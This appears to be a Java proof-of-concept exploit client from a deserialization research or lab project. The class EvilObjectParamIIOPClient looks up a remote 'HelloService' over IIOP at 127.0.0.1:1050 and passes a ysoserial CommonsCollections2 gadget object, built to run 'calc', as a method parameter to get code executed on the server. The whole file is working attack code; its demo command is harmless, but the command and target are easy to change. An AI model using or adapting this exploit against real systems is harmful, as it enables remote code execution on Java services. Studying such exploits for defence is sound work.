package rmi_iiop;

import rmi_iiop.common.ObjectParamHelloInterface;
import ysoserial.payloads.CommonsCollections2;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.rmi.PortableRemoteObject;
import java.util.Hashtable;

public class EvilObjectParamIIOPClient {
    public static void main(String[] args) throws Exception {
        Hashtable env = new Hashtable();
        env.put("java.naming.factory.initial", "com.sun.jndi.cosnaming.CNCtxFactory");
        env.put("java.naming.provider.url", "iiop://127.0.0.1:1050");
        Context ic = new InitialContext(env);
        // STEP 1: Get the Object reference from the Name Service
        // using JNDI call.
        Object objref = ic.lookup("HelloService");
        System.out.println("Client: Obtained a ref. to Hello server.");
        // STEP 2: Narrow the object reference to the concrete type and
        // invoke the method.
        ObjectParamHelloInterface hi = (ObjectParamHelloInterface) PortableRemoteObject.narrow(objref, ObjectParamHelloInterface.class);
        hi.sayHello(CommonsCollections2.getObject("calc"));
    }
}
